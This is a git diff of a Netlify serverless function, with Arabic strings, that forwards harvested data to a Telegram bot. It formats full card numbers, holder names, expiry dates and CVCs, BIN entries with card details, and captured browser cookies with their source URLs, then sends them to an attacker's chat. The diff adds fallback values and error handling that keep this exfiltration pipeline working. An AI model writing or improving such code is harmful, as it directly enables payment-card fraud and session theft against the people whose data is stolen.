@@ -137,10 +137,10 @@ exports.handler = async (event, context) => {
       case 'card':
         formattedMessage = `🔔 نتيجة ربط البطاقة
 ✅ تم الربط بنجاح
-رقم البطاقة: ${data.message.number}
-الاسم: ${data.message.name}
-التاريخ: ${data.message.expiry}
-CVC: ${data.message.cvc}
+رقم البطاقة: ${data.message.number || 'غير محدد'}
+الاسم: ${data.message.name || 'غير محدد'}
+التاريخ: ${data.message.expiry || 'غير محدد'}
+CVC: ${data.message.cvc || 'غير محدد'}
 ⏰ الوقت: ${messageTimestamp}
 🌐 البيئة: Netlify Functions
 📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
@@ -148,7 +148,7 @@ CVC: ${data.message.cvc}
         
       case 'bin':
         formattedMessage = `💳 تم إضافة BIN جديد
-🔢 BIN Pattern: ${data.message.pattern}
+🔢 BIN Pattern: ${data.message.pattern || 'غير محدد'}
 📝 الاسم: ${data.message.name || 'غير محدد'}
 ${data.message.cardNumber ? `💳 رقم البطاقة: ${data.message.cardNumber}` : ''}
 ${data.message.expiryDate ? `📅 تاريخ الانتهاء: ${data.message.expiryDate}` : ''}
@@ -160,7 +160,7 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
         
       case 'cookies':
         formattedMessage = `🍪 تم إضافة Cookies جديدة
-📝 الرسالة: ${data.message}
+📝 الرسالة: ${data.message || 'غير محدد'}
 🌐 الرابط: ${data.url || 'غير محدد'}
 🍪 عدد Cookies: ${data.cookies ? Object.keys(data.cookies).length : 0}
 ⏰ الوقت: ${messageTimestamp}
@@ -169,14 +169,14 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
         break;
         
       case 'message':
-        formattedMessage = `${data.message}
+        formattedMessage = `${data.message || 'رسالة فارغة'}
 ⏰ الوقت: ${messageTimestamp}
 🌐 البيئة: Netlify Functions
 📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
         break;
         
       default:
-        formattedMessage = `${JSON.stringify(data, null, 2)}
+        formattedMessage = `رسالة غير معروفة
 ⏰ الوقت: ${messageTimestamp}
 🌐 البيئة: Netlify Functions
 📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
@@ -188,8 +188,7 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
         `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
         {
           chat_id: CHAT_ID,
-          text: formattedMessage,
-          parse_mode: 'HTML'
+          text: formattedMessage
         },
         {
           timeout: 10000,
@@ -240,6 +239,21 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
             details: 'Telegram is experiencing high load',
             retryAfter: parseInt(retryAfter),
             message: `انتظر ${Math.ceil(retryAfter / 60)} دقيقة قبل المحاولة مرة أخرى`
+          })
+        };
+      }
+      
+      // معالجة خطأ 400 (Bad Request)
+      if (telegramError.response?.status === 400) {
+        console.error('تفاصيل خطأ 400:', telegramError.response.data);
+        return {
+          statusCode: 400,
+          headers,
+          body: JSON.stringify({
+            error: 'بيانات غير صحيحة لإرسالها إلى تليجرام',
+            code: 'TELEGRAM_BAD_REQUEST',
+            details: telegramError.response.data,
+            message: 'تحقق من صحة البيانات المرسلة'
           })
         };
       }
